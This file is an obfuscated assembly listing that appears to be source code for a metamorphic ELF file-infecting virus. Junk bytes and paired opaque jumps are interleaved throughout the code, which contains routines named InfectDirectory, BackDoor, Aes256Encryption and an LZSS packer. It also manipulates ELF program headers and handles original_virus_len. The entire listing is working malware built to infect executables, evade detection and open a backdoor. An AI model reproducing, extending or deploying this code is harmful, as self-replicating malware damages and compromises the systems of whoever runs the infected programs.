    jmp         $+4
db 0x56, 0x97
    js          ..@YZ7Fp326SRSB
    jns         ..@YZ7Fp326SRSB
..@yiw384EcjA9B:
%ifdef X86_64
    syscall
%endif
    jmp         ..@PlVQ3Tk3RyIX
..@sEPmasLq6z0x:
    movdqu      xmm1, oWORD [rsp+0x30]
    jmp         $+3
db 0x4a
    jmp         ..@ZfKlulV1btla
..@tOj5cqNX4voh:
    call_vsp    ExitProgram
    jl          ..@pd9RkAWI4gZ4
    jge         ..@pd9RkAWI4gZ4
..@fRUBSK2sElgi:
    pop         rsi
    jmp         $+4
db 0xff, 0x2c
    jmp         ..@Q0gpW3wtxCdn
..@GIBitIMmzYVF:
    call        Strcpy
    jb          ..@imcskUrbqBol
    jae         ..@imcskUrbqBol
..@1iQgI2I2yjcY:
    mov         r3, QWORD [r5+file.filesize]
    jmp         $+5
db 0x5c, 0x3c, 0xd6
    jmp         ..@TDXwXJKOxNbi
..@atWELHgHAhvW:
    shr         dx, 0x4
    jmp         $+4
db 0x66, 0x65
    jmp         ..@cea3XOZ7G6Jb
..@vtG0VKLcVfQ1:
    cmp         dl, BYTE [rsp+_LZSSE_OFF.match_len]
    jl          ..@Tq1wTsTSk7wg
    jge         ..@Tq1wTsTSk7wg
..@X7c2ahY4hoZY:
    mov         rbp, rbp
    jmp         $+5
db 0x31, 0xcc, 0xf0
    jmp         ..@xWAjhYs05cke
..@wcJ7VPXRC6dF:
    mov         rcx, rcx
    jmp         $+4
db 0x7d, 0x35
    jmp         $+4
db 0xf3, 0x40
    jb          ..@L6LizbSahhQZ
    jae         ..@L6LizbSahhQZ
..@6UylrRXL5DYQ:
    xor         rax, rax
    jmp         ..@bO0NnwzSCXaA
..@5os4CzlmuKwE:
%ifdef X86_64
    mov         rsi, original_virus_len+PADDING
%endif
    jmp         $+3
db 0xc7
    jmp         $+5
db 0x4d, 0xd1, 0xd9
    js          ..@hxKU23ZfqSzL
    jns         ..@hxKU23ZfqSzL
..@yGpnahbbI7eh:
    jnz         ..@9Q8ZQKsxxIJb
    jmp         $+4
db 0x61, 0xad
    jl          ..@gbLfxtMmadWA
    jge         ..@gbLfxtMmadWA
..@9e7OWom9Vqvt:
    push        r4
    jmp         $+3
db 0xbf
    jb          ..@MslVThomuWjq
    jae         ..@MslVThomuWjq
..@fjWAwPV0mHta:
    push        rdi
    jmp         ..@bM5LrGP8GjaS
..@88Ji0CTfS3jF:
    pop         rax
    jmp         $+3
db 0xec
    jmp         $+3
db 0x59
    jb          ..@43CnVAWh5KQh
    jae         ..@43CnVAWh5KQh
..@uurowmh1UbIt:
    xor         rdx, rdx
    js          ..@UVnKFydXjRfU
    jns         ..@UVnKFydXjRfU
..@XHrQJS3fgAh7:
    mov         DWORD [r5+file.filefd], eax
    js          ..@MlCa9mMiEOdd
    jns         ..@MlCa9mMiEOdd
..@ousofLZ1KkOI:
    pop         rsi
    jl          ..@KwcK4Ym1qscY
    jge         ..@KwcK4Ym1qscY
..@4PFoISvWyZCi:
    push        r2
    js          ..@pllo4JFSo1Ho
    jns         ..@pllo4JFSo1Ho
..@wUIteOR0j9e8:
    pop         rcx
    jl          ..@mAeIY6Kdau4T
    jge         ..@mAeIY6Kdau4T
..@m0x7QwpmzfxT:
    sub         r2, non_encrypted_len
    jmp         $+3
db 0x9e
    je          ..@KJqaMq2DCq4f
    jne         ..@KJqaMq2DCq4f
..@PZPtIhTwPm2m:
    mov         rax, rax
    jmp         ..@K33d7EFGvzJf
..@q5EL86Bwljgd:
    push        WORD 0x5c11
    jmp         $+5
db 0x80, 0xc3, 0x65
    jl          ..@FQbJsGOxUiyG
    jge         ..@FQbJsGOxUiyG
..@avQQVdFnvH8t:
    mov         rsp, rsp
    jl          ..@PfRUHR4azog5
    jge         ..@PfRUHR4azog5
..@iy6ucqtXuCwI:
    mov         rax, rax
    jl          ..@fa2iwOTtBHfW
    jge         ..@fa2iwOTtBHfW
..@doy61jmcnjan:
    pop         rcx
    jmp         $+3
db 0x35
    jb          ..@7nccjOziZS5C
    jae         ..@7nccjOziZS5C
..@saitJF0GWoRk:
    call        Aes256Encryption
    js          ..@4WBga5HnsOvq
    jns         ..@4WBga5HnsOvq
..@nMCth6Sk1k0j:
    cmp         BYTE [r5], DT_DIR
    jmp         $+5
db 0x5f, 0x89, 0x69
    jb          ..@hWWTjzwUJ6N1
    jae         ..@hWWTjzwUJ6N1
..@zHljI7k4xMLQ:
    pop         rdx
    jmp         $+5
db 0x8b, 0x00, 0xaa
    jmp         $+3
db 0x81
    jmp         ..@9DDSQeabGxVU
..@IKHjgoIyuBlm:
    xchg        rdi, rdi
    jmp         $+3
db 0x53
    js          ..@sfmpT0GCPymo
    jns         ..@sfmpT0GCPymo
..@kCYTPWF962gz:
    push        r1
    js          ..@8zDNuZy7LI4c
    jns         ..@8zDNuZy7LI4c
..@hbcsWVD5A6hx:
    mov         DWORD [rdi], eax
    jb          ..@nJhxLStnjAE6
    jae         ..@nJhxLStnjAE6
..@YvgbIvumeZxN:
%ifdef X86_64
    pop         rax
%endif
    jmp         ..@cfuLjVpru5by
..@JppMW4EfjyuH:
    jne         ..@tDBRJBo27maM
    jmp         $+4
db 0xdc, 0x23
    jmp         $+4
db 0xd8, 0x0c
    js          ..@9Vwzz62tWOCa
    jns         ..@9Vwzz62tWOCa
..@P52pnmOMQQpf:
    xor         r4, r4
    jmp         $+4
db 0x0e, 0xc9
    jmp         ..@l7XLzsJehcbN
..@5c9hwabEtH8l:
%ifdef X86_32
    mov         ecx, r3
%endif
    jmp         $+4
db 0x0b, 0xe1
    jb          ..@tNE7X15DeriK
    jae         ..@tNE7X15DeriK
..@g146mVgvuavu:
    movzx       r3, WORD [r1+e_h.e_phentsize]
    jmp         $+5
db 0x15, 0x3a, 0xa5
    jmp         $+4
db 0x7c, 0x56
    jl          ..@vb1awg91meXl
    jge         ..@vb1awg91meXl
..@OBumtCi7Fnhf:
    je          ..@kGw56hI4BaJP
    jmp         ..@JTwdl9bkuslM
..@GOHfy8pdmtFg:
    pop         rax
    jmp         $+3
db 0x47
    jmp         ..@Tb622CZ7Tjei
..@zxLjZyzvO03n:
    xchg        rsp, rsp
    jmp         $+3
db 0xb9
    js          ..@dqL9guPU9wb1
    jns         ..@dqL9guPU9wb1
..@xgeSzBgtCL9c:
    push        rcx
    js          ..@ZKWr2cWzxCjM
    jns         ..@ZKWr2cWzxCjM
..@1J7SLBLVn1e6:
    xchg        rdx, rdx
    js          ..@FlatvSZbtusD
    jns         ..@FlatvSZbtusD
..@OcTg4fL3acNb:
    pop         rcx
    je          ..@HH1c1d4b56Xi
    jne         ..@HH1c1d4b56Xi
..@OAtOhMQDbJNr:
    je          ..@YWaFNXEL47vZ
    jmp         $+5
db 0x45, 0xac, 0x02
    jb          ..@xEJk30IuzDTw
    jae         ..@xEJk30IuzDTw
..@GJwgRBuVyajO:
    add         m7, rax
    jmp         $+4
db 0x56, 0x93
    js          ..@iot82vC3Kojm
    jns         ..@iot82vC3Kojm
..@I8tpsgu1zqES:
    CFILE       r4d
    jmp         $+4
db 0xc9, 0xb5
    jmp         $+5
db 0x02, 0x9f, 0x7e
    jmp         $+5
db 0x22, 0x79, 0x84
    jmp         $+4
db 0xe6, 0xcb
    jl          ..@jRiZPA9lLlNZ
    jge         ..@jRiZPA9lLlNZ
..@Cl6vx5p1C081:
    ret
    jmp         $+4
db 0x9b, 0xcd
    jmp         MapFile
..@LluMcfq6NgJc:
    or          bx, dx
    je          ..@iRsbqBMDP7J5
    jne         ..@iRsbqBMDP7J5
..@gDemkyccZ1Ms:
    mov         rax, rax
    jmp         ..@SdZA8XNjHDkV
..@kdRidtYDY6H5:
    push        rdi
    je          ..@ToBhsUIDS9h6
    jne         ..@ToBhsUIDS9h6
..@2Xu2BXzgmAqO:
    jne         ..@ZcJZqhnAUXGj
    je          ..@6U1HmAjQdLJO
    jne         ..@6U1HmAjQdLJO
..@IJndamN12rlG:
    mov         rsp, rsp
    jmp         $+4
db 0x5f, 0x0f
    js          ..@Yt69XV2qARzb
    jns         ..@Yt69XV2qARzb
..@0TKFEztXSpBD:
    je          ..@7T9cnKhVR5yS
    jmp         $+5
db 0xe1, 0xfc, 0x8c
    jmp         $+4
db 0xe6, 0x6a
    jl          ..@wkvoch8rIZNv
    jge         ..@wkvoch8rIZNv
..@7Ihh78aORwbI:
    push        rdx
    jmp         $+5
db 0x31, 0x47, 0x9b
    jb          ..@TXxlFR5E7s1p
    jae         ..@TXxlFR5E7s1p
..@a6CVYMS47fgG:
    xchg        rsp, rsp
    jmp         $+4
db 0x56, 0xc3
    jmp         $+5
db 0xd7, 0x9c, 0x7d
    jmp         $+4
db 0x75, 0x35
    jl          ..@1YN4xV1HKgJU
    jge         ..@1YN4xV1HKgJU
..@dR0mzIBZS4ZQ:
    mov         r2, m5
    jmp         ..@8kHvrzKdmYk9
..@leNunFjoYziw:
    mov         rsp, rsp
    je          ..@RAxuWG3zJibL
    jne         ..@RAxuWG3zJibL
..@TzYLTYaWq1c5:
    xor         rcx, rcx
    jmp         ..@4iV6zF0nw1wt
..@88JKtx0Jvh8P:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         ..@i3IfFwSUiSVz
..@AToVnatlbBVz:
    push        rdi
    jb          ..@sWmELSJkucJQ
    jae         ..@sWmELSJkucJQ
..@4aLjmWZPCKSx:
    jl          ..@coCMycr5WKvm
    js          ..@zJarJd1VVDl7
    jns         ..@zJarJd1VVDl7
..@xIkJiLkPSdGz:
    pop         rdi
    jmp         ..@HAWiM2ATlW2V
..@8lKD1C2ceF1I:
    mov         DWORD [r5+file.filefd], 0x00
    jmp         $+4
db 0x71, 0x83
    jmp         $+3
db 0x97
    jmp         ..@WfJk93ezAPhg
Aes256Encryption:
    jmp         ..@ZkU3KUlu5RXz
..@Gg42ruPvMOD6:
    mov         r1, r5
    jmp         $+5
db 0xad, 0x77, 0x08
    jmp         ..@YwW9FqVy3Aih
..@Cl5LslPkwhTo:
    pop         rbx
    jmp         $+4
db 0x0c, 0xc3
    js          ..@JPrCogTRy3OD
    jns         ..@JPrCogTRy3OD
..@vFHzrcooATIl:
    mov         rsi, rsp
    jl          ..@saClQoy6AUwq
    jge         ..@saClQoy6AUwq
..@ZfKlulV1btla:
    mov         rsi, rsi
    jmp         $+5
db 0xf2, 0x21, 0x83
    jmp         $+3
db 0x12
    jmp         ..@piGMzZPpmmbK
..@pEN3FVFdl4eW:
    mov         rax, 1
    jmp         $+4
db 0x48, 0xb4
    jb          ..@VMarzndVMBB3
    jae         ..@VMarzndVMBB3
..@oYQDSiODW4YX:
    movdqu      xmm1, oWORD [rsp+0x50]
    jl          ..@TxEXkjJb8RZM
    jge         ..@TxEXkjJb8RZM
..@onx4a3ZalHl3:
    push        rdi
    jmp         $+5
db 0xfb, 0xa4, 0xaf
    jmp         ..@fZnctaitjAT2
..@517jMnRdpYN8:
    pop         rax
    jl          ..@oI1DlMWJkcQt
    jge         ..@oI1DlMWJkcQt
..@35yQqKStEUGr:
    jne         ..@oVIGsxIh9dkP
    jb          ..@uvnEB2dw33Wx
    jae         ..@uvnEB2dw33Wx
..@n3sxgTnSsMHG:
    cmp         BYTE [rsp+_LZSSE_OFF.match_len], MIN_LENGTH
    jb          ..@oMFgiWwyH28C
    jae         ..@oMFgiWwyH28C
..@pvjGCsO36cXV:
    jle         ..@YWaFNXEL47vZ
    js          ..@NS3waNe4acUI
    jns         ..@NS3waNe4acUI
..@0T2FWS7QNlaH:
    xchg        rsp, rsp
    jl          ..@F3qYOVu5nCNm
    jge         ..@F3qYOVu5nCNm
..@yXUq5Nl0ykZs:
    mov         rax, rax
    jmp         $+4
db 0x7d, 0xd2
    jmp         $+4
db 0x19, 0xf6
    jmp         ..@OgrBIOwGN9RW
..@ysUffXhCZ70b:
    inc         WORD m5
    jb          ..@EmAVz8Jfo2XC
    jae         ..@EmAVz8Jfo2XC
..@fGc6p1JwlUyj:
    mov         rdi, rdi
    jmp         $+5
db 0x28, 0x02, 0xda
    jmp         $+3
db 0xb4
    jmp         ..@CvqldWChfSE5
..@BrFVdfwk9Bur:
    push        rdi
    jmp         $+4
db 0x65, 0x4e
    jmp         ..@1JGuPTU1VNJ9
..@Mc1LN8Vo7TAw:
    mov         rsp, rsp
    js          ..@coCMycr5WKvm
    jns         ..@coCMycr5WKvm
..@LYPapSP9pzLW:
    push        rbx
    jmp         $+3
db 0x27
    jmp         ..@SOPER4uleJvr
..@fDRxV1S5kEYP:
    mov         r1, m6
    je          ..@GQau6urzvZZ6
    jne         ..@GQau6urzvZZ6
..@m31NW4ukKKcX:
    mov         r4, 0
    jmp         $+4
db 0x2a, 0xef
    jmp         $+4
db 0x77, 0x8d
    jmp         $+4
db 0x80, 0x99
    jl          ..@almVf3sBgiLw
    jge         ..@almVf3sBgiLw
..@enTk2Srz3AYx:
    rep         nop
    jmp         $+3
db 0x5e
    jmp         ..@xwCJpFAuCwRa
..@6DV5otL9KrV1:
    mov         rsi, rsi
    jmp         $+4
db 0xd3, 0xb9
    js          ..@xbx2BH2a1jQl
    jns         ..@xbx2BH2a1jQl
..@XC8rrRJXvVdr:
    mov         r1d, eax
    jmp         ..@SVOWUO5qojIt
..@RWKq6VTEt1oT:
    pop         rbx
    jb          ..@8zJfLqItItqz
    jae         ..@8zJfLqItItqz
..@zAt1DilZrahu:
    push        rbx
    jl          ..@rh8Nlo10CAt4
    jge         ..@rh8Nlo10CAt4
..@HK2Qcix5p6kh:
    push        rcx
    jmp         $+4
db 0xbc, 0x4c
    jmp         ..@maFQXieF4OsY
..@0GjL3ynpuHmD:
    xchg        rdi, rdi
    jl          ..@MmmT2Yc2mLLn
    jge         ..@MmmT2Yc2mLLn
..@RfRKpZfVgFYj:
    push        rdx
    jmp         $+5
db 0x95, 0x22, 0x23
    jb          ..@OpaCI8iOaIBE
    jae         ..@OpaCI8iOaIBE
..@90gszdfhIyyf:
    mov         rbp, rbp
    jmp         $+4
db 0xea, 0x77
    jmp         $+3
db 0x18
    jmp         ..@1HQPY8Xod4is
..@9tuvYh3XNOeL:
    mov         r2, r1
    jmp         ..@9xSRgi5VxA8a
..@FdRWcAv1LpnF:
    mov         rsp, rsp
    jmp         $+4
db 0xb1, 0x47
    jl          ..@0TKFEztXSpBD
    jge         ..@0TKFEztXSpBD
..@1GL6orvEuv3i:
    xor         r3, r3
    jl          ..@gP26orlXwIsv
    jge         ..@gP26orlXwIsv
..@KEqUTN940LRw:
    xchg        rax, rax
    jmp         $+5
db 0x3e, 0xa0, 0x91
    je          ..@XnD4ButUQ95x
    jne         ..@XnD4ButUQ95x
..@kMf7hRKR42kQ:
    add         rsp, _PROC_OFF_size
    jmp         $+3
db 0x1b
    jmp         $+3
db 0xe4
    jb          BackDoor
    jae         BackDoor
..@cea3XOZ7G6Jb:
    add         ecx, 1
    jmp         $+4
db 0x47, 0x47
    jmp         $+4
db 0xcf, 0x08
    jmp         $+4
db 0xaa, 0xcb
    je          ..@LytTfmzFYnf5
    jne         ..@LytTfmzFYnf5
..@YL0Q8uAJ3xHX:
    push        rdx
    je          ..@deFhbVhfPNoC
    jne         ..@deFhbVhfPNoC
..@CJD8VuXV9x88:
    mov         DWORD [rsp+_PROC_OFF.dirfd], eax
    jmp         ..@1aqJXUjaGUE5
..@FQtRjWfEiy9e:
    pop         rdx
    jb          ..@wndsvVOXklxe
    jae         ..@wndsvVOXklxe
..@NytjjNOqsSVu:
    CFILE       DWORD [r5+file.filefd]
    jmp         ..@DleFbtqn7Frp
..@Tq1wTsTSk7wg:
    jle         ..@GuWIh8qm4zMg
    jmp         $+4
db 0xeb, 0xb9
    jmp         ..@mxG4kBZe2neY
..@Z4J4Iio5dFMc:
    mov         BYTE [r1], 0x00
    jmp         ..@MMiOO4GjfdJ3
..@EmAVz8Jfo2XC:
    jmp         ..@xWucXduicjVM
    jmp         $+5
db 0xf8, 0x7a, 0x3a
    jmp         ..@OwykEirAaJoE
..@dKaZXJtyQDwU:
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    jb          ..@ruT8TsPExY8N
    jae         ..@ruT8TsPExY8N
..@wKVgM87oHujP:
    ret
    jmp         $+4
db 0x94, 0xc3
    jmp         DYNPIEValidation
..@cfuLjVpru5by:
%ifdef X86_64
    xchg        rax, rax
%endif
    jmp         ..@bfteJigreMQu
MapFile:
    jmp         ..@gD2lsVH2GNvC
..@XGDAcwfcBIBU:
    push        rdx
    jl          ..@gTbtnQvJ3T25
    jge         ..@gTbtnQvJ3T25
..@k79uQHWzb1qd:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    jmp         $+4
db 0xf3, 0xc0
    jmp         $+3
db 0x5b
    jmp         $+4
db 0x91, 0x99
    jb          ..@dKaZXJtyQDwU
    jae         ..@dKaZXJtyQDwU
..@qH013f3IyyTV:
%ifdef X86_32
    push        rbx
%endif
    jmp         $+3
db 0x0d
    jmp         ..@y2DqRQRSx2zJ
..@QJ4zg0iMkPjX:
    add         rdi, rcx
    jmp         $+5
db 0xbc, 0x86, 0xf8
    jmp         $+5
db 0x4b, 0xe3, 0xfc
    jmp         ..@FLNHLuISOZsQ
..@OIo3kTj6LdCm:
    xchg        rsi, rsi
    jl          ..@YbXghfMFSOf1
    jge         ..@YbXghfMFSOf1
..@fIaYYOyruXyW:
    mov         r2, QWORD [r5+file.filesize]
    jmp         ..@jTdePBwfMkWg
..@58B7poHbjusX:
    pop         rdi
    js          ..@3OVYbALb6hVW
    jns         ..@3OVYbALb6hVW
..@daUgcWtSrIQp:
    rep         movsb
    jmp         $+4
db 0xbc, 0x41
    jl          ..@saNew321CcRV
    jge         ..@saNew321CcRV
..@7yCi15nTRLtY:
    VAR         packed, execve1
    jmp         ..@m1ABnb2wqu04
..@3E9qGapb1Qqy:
    push        r3
    jmp         $+5
db 0xa9, 0xd4, 0x70
    jmp         $+4
db 0x7d, 0x7d
    je          ..@P2YWDIwt1LjV
    jne         ..@P2YWDIwt1LjV
..@cfb5JeTStFai:
    xchg        rdi, rdi
    jmp         $+4
db 0x47, 0xe9
    jmp         $+3
db 0x5f
    jmp         $+4
db 0x3a, 0x5e
    jb          ..@x1yap4PY08cP
    jae         ..@x1yap4PY08cP
..@aEYY7gCxjL6r:
    jge         ..@hgDoGSPPBir0
    jmp         $+4
db 0x1b, 0x57
    jmp         $+4
db 0x82, 0x10
    jmp         ..@rFABBf1o2dPp
..@9Mc1iuwoM5O9:
    push        rdx
    jb          ..@N5ep8cFZotWZ
    jae         ..@N5ep8cFZotWZ
..@OVbvfR3vh6hj:
    syscall
    jmp         $+3
db 0x2c
    jl          ..@0gd5BlxpdGiL
    jge         ..@0gd5BlxpdGiL
..@mHLiFfKyo1bZ:
    pop         rdx
    jmp         ..@MGMvDXCyVFac
..@xgF05kxS18np:
    mov         rbp, rsp
    jmp         $+5
db 0xd9, 0x44, 0x89
    jmp         $+4
db 0x60, 0xf7
    jl          ..@6BqqJqqjIlMd
    jge         ..@6BqqJqqjIlMd
..@sf2BzOkylmw9:
    mov         rsi, rsi
    jmp         $+4
db 0xf7, 0xe3
    jmp         $+3
db 0x30
    jmp         ..@Ufqk1kIdBHbz
..@kStxBkyOxi1q:
    xor         r4, r4
    js          ..@9XeejvdJfcgN
    jns         ..@9XeejvdJfcgN
..@IXkRmKDwY0vW:
    mov         rdi, rdi
    jmp         ..@2OTaKJbKgDqO
..@yadnR8KjLxCO:
    pop         rcx
    jl          ..@bwYbIhIXnm7x
    jge         ..@bwYbIhIXnm7x
..@ayI9g5LBwTEB:
    pop         rbx
    jmp         $+3
db 0x8e
    jmp         $+4
db 0x60, 0xdc
    jb          ..@1CjwyqTmEoln
    jae         ..@1CjwyqTmEoln
..@PfRUHR4azog5:
    mov         rsi, rsi
    jl          ..@cH50iUuGPKht
    jge         ..@cH50iUuGPKht
..@hwpGTTVUBtAT:
    mov         rcx, signature_len
    jmp         $+5
db 0xee, 0xfa, 0xbc
    jmp         ..@vQWt96PaKuUr
..@zljoZ0iBq8fQ:
    push        r1
    jl          ..@UlRUMLeab8YC
    jge         ..@UlRUMLeab8YC
..@BzOiYAFZmAiZ:
    mov         r1, rax
    jmp         ..@ggxhkkEOT2iH
..@eXZ5rItjc4Na:
    push        rdi
    jmp         $+3
db 0xc6
    jmp         $+5
db 0x8a, 0x52, 0xe5
    jb          ..@djrXPitlhEls
    jae         ..@djrXPitlhEls
..@wakv2WUc0CkC:
    mov         BYTE [rsp+_LZSSE_OFF.bits], 0x00
    jmp         $+5
db 0xe9, 0xcc, 0xa6
    jmp         $+4
db 0x07, 0xa4
    je          ..@IXnpAHYPCSo3
    jne         ..@IXnpAHYPCSo3
..@d5xy0QEqUwmP:
    mov         rbp, rbp
    js          ..@1DTOdRXkM1a9
    jns         ..@1DTOdRXkM1a9
..@bNVjAun3tljh:
    xor         rax, rax
    js          ..@3ZM9iN0wySdU
    jns         ..@3ZM9iN0wySdU
..@vLasp30cQQ4e:
    mov         r4, QWORD [rsp+_PROC_OFF.dirindex]
    je          ..@emyLD7i8QGyE
    jne         ..@emyLD7i8QGyE
..@qFFxgp0k3GEE:
    mov         rax, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    js          ..@ceGTkUYIWaq5
    jns         ..@ceGTkUYIWaq5
..@AKKUPXu9d4Si:
    mov         DWORD [r2], PT_LOAD
    js          ..@atA4OZlF9b0G
    jns         ..@atA4OZlF9b0G
..@BYNm47wM8Ch8:
    xchg        rdx, rdx
    jb          ..@JL2jTvQfTlPV
    jae         ..@JL2jTvQfTlPV
..@dShQsk7vN4j8:
    pop         rdi
    jmp         $+4
db 0x13, 0x10
    jmp         ..@shiTzSgl1Bgb
..@emByAKHOJGk6:
    pop         rdx
    js          ..@gx8YocP6ZaVR
    jns         ..@gx8YocP6ZaVR
..@rgFv7DPG1c43:
    pop         r2
    js          ..@akjwRgS5CmBq
    jns         ..@akjwRgS5CmBq
..@CxlvKZDdm5wR:
    inc         QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         ..@uEbpNtmKcjpw
..@kYm7x9sSGUi5:
    pop         rsi
    js          ..@V4QiyffFRx3x
    jns         ..@V4QiyffFRx3x
..@YxZtoBTzoEDs:
    mov         r2, original_virus_len+PADDING
    jmp         $+3
db 0x59
    jmp         ..@voEyG3b02KGB
..@qfYltYky6Uf5:
    pop         rbx
    js          ..@4DL3oA2ueMTh
    jns         ..@4DL3oA2ueMTh
..@7nccjOziZS5C:
    pop         rdx
    jl          ..@scwCbUJEGGLF
    jge         ..@scwCbUJEGGLF
..@6lovXW5ExuDJ:
    movdqu      xmm1, oWORD [rsp+0x10]
    jmp         ..@rLSBfvk7vcxW
..@OgrBIOwGN9RW:
    mul         r3 
    jmp         ..@wpIjG9FEhj3m
..@6Ykh0caGybq1:
    push        rbx
    jmp         $+5
db 0xb6, 0x91, 0xaa
    jmp         $+5
db 0xd6, 0xbc, 0x06
    jmp         ..@5WKb2WdXV3ur
..@ZluYxhdJK6zO:
    pop         rdi
    jmp         $+3
db 0x06
    jb          ..@jJPHvksB0rn1
    jae         ..@jJPHvksB0rn1
..@D9nzThNk4yGz:
    mov         rdx, rdx
    js          ..@6vg9pQqaam4I
    jns         ..@6vg9pQqaam4I
..@ACrUM1cD443F:
    pop         rdi
    js          ..@qLPz0cCamMiQ
    jns         ..@qLPz0cCamMiQ
..@fDHN0DuHJocY:
    mov         rsi, rsi
    jmp         ..@kAfxVTE86A9l
..@vxiO5Vy5lIzP:
    mov         r1, r5
    jl          ..@qVaElCqUnUvs
    jge         ..@qVaElCqUnUvs
..@B507lobJntHj:
    mov         r1, QWORD [r5+file.fileptr]
    jl          ..@cBzDieMj4SwF
    jge         ..@cBzDieMj4SwF
..@OwykEirAaJoE:
    cmp         r4w, WORD [r1+e_h.e_phnum]
    jmp         $+3
db 0xa8
    jmp         $+3
db 0x8e
    jmp         ..@FZm1bJBxD9fQ
..@EbCRM5r7dkZH:
    xchg        rbx, rbx
    jmp         $+3
db 0x3a
    jmp         $+4
db 0x36, 0xe3
    jl          ..@sMg1S8wKMNWE
    jge         ..@sMg1S8wKMNWE
..@1nI1UPs7H1lP:
    cmp         rax, 0x02
    jmp         $+5
db 0x28, 0xe7, 0x1b
    jmp         $+3
db 0xdd
    jmp         ..@OBumtCi7Fnhf
..@OwQLqk02S9BO:
    mov         BYTE [rsp+_LZSSE_OFF.mask], 10000000b
    js          ..@rWMFCZ5Y7qmA
    jns         ..@rWMFCZ5Y7qmA
..@nS9oytdHeOjV:
    push        rdx
    jmp         $+5
db 0xc9, 0xf3, 0xd2
    je          ..@2FeYJOK7FKq4
    jne         ..@2FeYJOK7FKq4
..@gTbtnQvJ3T25:
    pop         rdx
    jmp         ..@2Xu2BXzgmAqO
..@Sn4hGePRdkj8:
    mov         rbp, rbp
    jmp         $+5
db 0x8e, 0x95, 0x85
    jmp         $+4
db 0x12, 0x25
    jmp         $+3
db 0x6d
    jl          ..@a4hkKl0QIyhx
    jge         ..@a4hkKl0QIyhx
..@FhQ6oSsd8ylp:
    mov         rbx, rbx
    jmp         $+3
db 0x51
    je          ..@1EIL50afa1F2
    jne         ..@1EIL50afa1F2
..@gnlZOcHScLRG:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    jmp         ..@0lFAl2mw0JYl
..@L8wyhOw1uLbh:
    xchg        rax, rax
    je          ..@nyqbvC7NYUb0
    jne         ..@nyqbvC7NYUb0
..@FOBus61VOMET:
    pop         rdi
    jmp         ..@zAt1DilZrahu
..@n2FBnpQ0qGYE:
    mov         edx, LOOKAHEAD_LENGTH
    jmp         ..@jTIXffHtN6y4
..@quKPZhVzSbR3:
    mul         r3
    jmp         $+4
db 0x1e, 0x62
    je          ..@R7B9sTJ7lMVU
    jne         ..@R7B9sTJ7lMVU
..@p52j8eEf9AdB:
    mov         rsp, rsp
    jmp         $+3
db 0x09
    jmp         $+5
db 0xc7, 0xac, 0x5f
    jmp         $+5
db 0x49, 0x71, 0x77
    jmp         ..@5gHEOUkX8Qhu
..@pSVKfTnqT2qW:
    or          bx, ax
    jmp         $+5
db 0xfb, 0xed, 0xc0
    jb          ..@YtUcgTxfgnnH
    jae         ..@YtUcgTxfgnnH
..@1CjwyqTmEoln:
    push        rcx
    jmp         $+3
db 0x25
    jmp         $+4
db 0x54, 0x86
    jmp         $+5
db 0xce, 0x1e, 0x1c
    js          ..@TiRMvuSUqkdU
    jns         ..@TiRMvuSUqkdU
..@f0wgNvWcCSBi:
    push        rbx
    jmp         $+3
db 0x93
    jmp         ..@Phl9dEofPHmq
..@auAJ2T9VRRQ2:
    mov         rsi, rsi
    js          ..@tOj5cqNX4voh
    jns         ..@tOj5cqNX4voh
..@5gHEOUkX8Qhu:
    push        rbx
    jmp         ..@SLQwyCvmHvVO
..@SF6CBMWvtPCh:
    pop         rdx
    jmp         $+5
db 0x92, 0x27, 0x68
    jmp         ..@4sZKhFNV1GaC
..@JmMzbJBbGdWk:
    pop         rsi
    jmp         $+5
db 0x8b, 0xef, 0x24
    jmp         $+4
db 0x5a, 0x90
    jmp         $+5
db 0xe0, 0x52, 0x55
    js          ..@rs60I3fgbWkB
    jns         ..@rs60I3fgbWkB
..@dGxZWbOYFJ6J:
    pop         rdi
    jl          ..@tLrQztUBKXQK
    jge         ..@tLrQztUBKXQK
..@s7XqDYeO35hu:
    xor         rcx, rcx
    jmp         ..@7nWT5pXw1Y2G
..@TzHvdUzhCE8K:
    call        InfectDirectory
    je          ..@vEaIdtrUc706
    jne         ..@vEaIdtrUc706
..@blHtSZ80DA9Q:
    pop         rdx
    jmp         $+4
db 0xbd, 0xa2
    jmp         ..@gRG5Ce3d3YyE
..@vugq9mjZP91g:
    mov         r2, original_virus_len-non_packed_len
    jmp         $+3
db 0x29
    js          ..@Y3HVrvZTCcSt
    jns         ..@Y3HVrvZTCcSt
..@GWxJn2ogSgv3:
    mov         rdx, rdx
    je          ..@0cywMreLtYGd
    jne         ..@0cywMreLtYGd
..@Nfx6kaeVOCD8:
%ifdef X86_64
    mov         r10d, 0x01
%endif
    jmp         $+5
db 0x1c, 0x71, 0x7c
    jmp         ..@J4hmxidokhcy
..@3djeCv2G00eo:
    push        rsi
    jmp         $+4
db 0xe8, 0xa0
    jmp         ..@I7iXZyMTs9f3
..@dMJJ42WcCxee:
    syscall
    jmp         $+4
db 0xa5, 0x9d
    jmp         ..@FrBdeC7jzcDg
..@YZ7Fp326SRSB:
    push        rbx
    jmp         ..@2I7E3kbz7D1f
..@bHICX05AEb1U:
    syscall
    jmp         $+5
db 0xc2, 0x56, 0x9d
    jl          ..@Xr8oywAXiPcP
    jge         ..@Xr8oywAXiPcP
..@O8z2WoQMkOu3:
    mov         rax, QWORD [rsi+rcx+bytes]
    jmp         $+5
db 0xde, 0x9c, 0xee
    je          ..@bSzxKCEvNLXy
    jne         ..@bSzxKCEvNLXy
..@SVmRU8NE6mIE:
    pop         rsi
    jmp         $+3
db 0x64
    jl          ..@MP9QmLL2muUr
    jge         ..@MP9QmLL2muUr
..@x4IQQVek5OMk:
    xchg        rcx, rcx
    jb          ..@xmqoNGUfBkYD
    jae         ..@xmqoNGUfBkYD
..@uCHjsew5tQpJ:
    jg          ..@oVIGsxIh9dkP
    jmp         $+4
db 0xd5, 0x53
    jmp         ..@fKaxGJ6OI2Il
..@t33KepKXXGqR:
    mov         al, BYTE [rsp+_LZSSE_OFF.bits]
    je          ..@7b9pm03sGTv3
    jne         ..@7b9pm03sGTv3
..@VYpQg6IBx0Kc:
    push        rdx
    jmp         $+3
db 0xef
    jmp         $+4
db 0xdf, 0xa3
    jmp         $+4
db 0xb9, 0x2c
    jl          ..@jBiemNfnZzDG
    jge         ..@jBiemNfnZzDG
